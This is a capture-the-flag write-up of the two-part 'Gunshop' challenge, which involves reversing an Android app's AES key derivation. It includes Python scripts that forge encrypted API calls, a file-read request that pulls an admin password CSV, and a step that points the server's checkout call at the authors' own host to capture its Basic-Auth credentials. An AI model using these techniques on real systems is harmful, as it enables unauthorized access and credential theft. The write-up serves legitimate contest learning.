# Gunshop 1 (re/web, 273p, 10 solved)

A two stage challenge, starting with an [obfuscated android app](GunShop.apk)

There is some code to go through but eventually we can figure out that:

1. App is making requests to some host for endpoints `/sessionStart`, `/selectGun` and `/finalizeSession`. There is also and endpoint `/getFile?filename=`.
2. App is encrypting payloads using `AES` and encoding them in base64
3. There initial encryption key is derived via:

```java
PackageInfo packageInfo = context.getPackageManager().getPackageInfo(str, 64);
if (packageInfo.signatures.length == 1) {
    str2 = base64(MessageDigest.getInstance("SHA-256").digest(packageInfo.signatures[0].toByteArray())).substring(0, 16);
}
```

This is used to decrypt the target host and next AES key from the app resources:

```
f18a = C0018m.decryptFile("configUrl", (Context) this);
this.f22q = C0018m.decryptFile("configKey", (Context) this);
```

We were unsure what exactly is used for SHA-256 so we checked all fingerprints from the app signatures, and we finally got the right one.

This way we decrypt the key `123456789as23456` and host `https://darkbloodygunshop.asisctf.com`.

At the same time we got the hostname also simply by sniffing the outgoing traffic.
If we now run the app and try to login, we get error that `username not found in users_gunshop_admins.csv`.

But we've seen the `getFile` endpoint so we can try: https://darkbloodygunshop.asisctf.com/getFile?filename=users_gunshop_admins.csv and we recover the passwords file.

From this we get the credentials: `alfredo` and `YhFyP$d*epmj9PUz`.

We can login to the mobile app now, but it doesn't really do much for us.

Since we recovered the encryption key for the traffic, we can try to access the REST endpoinst on our own:

```python
s = requests.session()
key = "123456789as23456"
payload = json.dumps({"username": "alfredo", "password": "YhFyP$d*epmj9PUz", "device-id": "1235"})
aes = AES.new(key, AES.MODE_ECB)
payload = base64.b64encode(aes.encrypt(pad(payload)))
r = s.post("https://darkbloodygunshop.asisctf.com/startSession", verify=False, data={"user_data": payload})
result = r.text.decode("base64")
result = aes.decrypt(result)[:-5]
print(result)
```

We form the same json payload as seen in the java code and running this gives us:

```json
{"key": "9a533b1465af2b63de48494c93041d92", "deviceId": "1235", "flag1": "ASIS{d0Nt_KI11_M3_G4NgsteR}", "list": [{"pic": "1.jpg", "id": "GN12-34", "name": "Tiny Killer", "description": "Excellent choise for silent killers."}, {"pic": "2.jpg", "id": "GN12-301", "name": "Gru Gun", "description": "A magic underground weapon."}, {"pic": "3.png", "id": "GN12-1F52B", "name": "U+1F52B", "description": "Powerfull electronic gun. Usefull in chat rooms and twitter."}, {"pic": "4.jpeg", "id": "GN12-1", "name": "HV-Penetrator", "description": "The Gun of future."}, {"pic": "5.jpg", "id": "GN12-90", "name": "Riffle", "description": "Protect your self with me."}, {"pic": "6.png", "id": "GN12-21", "name": "Gun Shop Subscription", "description": "Subscription 1 month to gun shop."}, {"pic": "7.png", "id": "GN12-1002", "name": "GunSet", "description": "A Set of weapons, useful for assassins."}]}
```

Which concludes the first part of the task with the flag `ASIS{d0Nt_KI11_M3_G4NgsteR}`.

# Gunshop 2 (web, 304p, 8 solved)

The second part starts where the first one finished.
Now the traffic gets encrypted by the new `key` parameter we received in the json payload.

We proceed with performing the same REST calls as the App normally does, we select a gun:

```python
obj = json.loads(result)
key = obj["key"].decode("hex")

payload = json.dumps({"gunId": "GN12-21"})
aes = AES.new(key, AES.MODE_ECB)
payload = base64.b64encode(aes.encrypt(pad(payload)))
r = s.post("https://darkbloodygunshop.asisctf.com/selectGun", verify=False, data={"user_data": payload})
print(r.text)
result = r.text.decode("base64")
result = aes.decrypt(result)
print(result)
```

This gives us:

```json
{"shop": {"name": "City Center Shop", "url": "http://188.166.76.14:42151/DBdwGcbFDApx93J3"}}
```

So we got the host for the second flag.
But if we try to access this URL is accepts only POST and there is Basic-Auth on top of it.

The last thing that mobile App does is to call `/finalizeSession` endpoint passing the store `url`, which somehow submits our order.
After some thinking we figured that maybe in fact the darkbloodygunshop webapp is sending a proper POST request to the shop we send as parameter.
If so maybe it includes the credentials!

We proceed with sending the request with our own URL waiting for data:

```python
payload = json.dumps({"shop": "our.host"})
aes = AES.new(key, AES.MODE_ECB)
payload = base64.b64encode(aes.encrypt(pad(payload)))
s.post("https://darkbloodygunshop.asisctf.com/finalizeSession", verify=False, data={"user_data": payload})
print(r.text)
result = r.text.decode("base64")
result = aes.decrypt(result)
print(result)
```

And yes, we receive a request:

```python
{
  "content-length": "30",
  "user-agent": "python-requests/2.20.1",
  "accept": "*/*",
  "accept-encoding": "gzip, deflate",
  "content-type": "application/x-www-form-urlencoded",
  "authorization": "Basic YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6"
}
```

There is some POST body, but what we really want is basic auth payload `YmlnYnJvdGhlcjo0UWozcmM0WmhOUUt2N1J6` which decoded as base64 is `bigbrother:4Qj3rc4ZhNQKv7Rz`.

If we now send request to the real shop with those credentials we get back a flag: `ASIS{0Ld_B16_br0Th3r_H4d_a_F4rm}`
